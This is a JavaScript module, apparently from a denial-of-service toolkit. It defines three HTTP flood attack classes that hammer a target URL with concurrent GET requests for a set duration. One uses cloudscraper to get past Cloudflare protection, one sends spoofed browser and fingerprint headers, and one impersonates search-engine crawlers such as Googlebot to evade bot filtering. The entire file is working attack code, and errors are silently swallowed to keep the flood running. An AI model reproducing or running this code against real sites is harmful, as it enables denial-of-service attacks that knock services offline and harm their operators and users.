import axios from 'axios';
import cloudscraper from 'cloudscraper';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * Cloudflare Bypass using Cloudscraper
 */
export class CloudflareBypass {
    constructor(targetUrl, duration, rpc = 1, proxies = null) {
        this.url = targetUrl;
        this.duration = duration;
        this.rpc = rpc;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        const promises = [];
        const requestsPerBatch = Math.max(this.rpc * 5, 50); // Multiply RPC by 5, min 50

        for (let i = 0; i < requestsPerBatch; i++) {
            if (!this.active) break;

            const promise = cloudscraper.get(this.url, {
                timeout: 10000,
                headers: {
                    'User-Agent': Tools.randomChoice([
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                    ])
                }
            }).then(response => {
                REQUESTS_SENT.add(1);
                BYTES_SENT.add(response.length || 0);
            }).catch(() => {
                // Silent fail
            });

            promises.push(promise);
        }

        await Promise.allSettled(promises);
    }

    stop() {
        this.active = false;
    }
}

/**
 * Advanced Bypass Method
 */
export class AdvancedBypass {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateAdvancedHeaders() {
        return {
            'User-Agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'TE': 'trailers',
            'DNT': '1',
            ...Tools.generateSpoofHeaders(this.url.host),
            // TLS fingerprint spoofing
            'X-TLS-Version': 'TLSv1.3',
            'X-TLS-Cipher': 'TLS_AES_256_GCM_SHA384',
            // Browser fingerprint
            'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"'
        };
    }

    async attack() {
        const promises = [];

        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;

            const promise = axios.get(this.url.href, {
                headers: this.generateAdvancedHeaders(),
                timeout: 10000,
                validateStatus: () => true,
                maxRedirects: 5
            }).then(response => {
                REQUESTS_SENT.add(1);
                BYTES_SENT.add(response.data ? response.data.length : 0);
            }).catch(() => {
                // Silent fail
            });

            promises.push(promise);
        }

        await Promise.allSettled(promises);
    }

    stop() {
        this.active = false;
    }
}

/**
 * Bot Simulation Attack (Search Engine Bots)
 */
export class BotSimulation {
    constructor(targetUrl, duration, rpc = 1) {
        this.url = targetUrl;
        this.duration = duration;
        this.rpc = rpc;
        this.active = true;
        this.botAgents = [
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)',
            'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)'
        ];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        const promises = [];

        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;

            const promise = axios.get(this.url, {
                headers: {
                    'User-Agent': Tools.randomChoice(this.botAgents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                },
                timeout: 10000,
                validateStatus: () => true
            }).then(response => {
                REQUESTS_SENT.add(1);
                BYTES_SENT.add(response.data ? response.data.length : 0);
            }).catch(() => {
                // Silent fail
            });

            promises.push(promise);
        }

        await Promise.allSettled(promises);
    }

    stop() {
        this.active = false;
    }
}
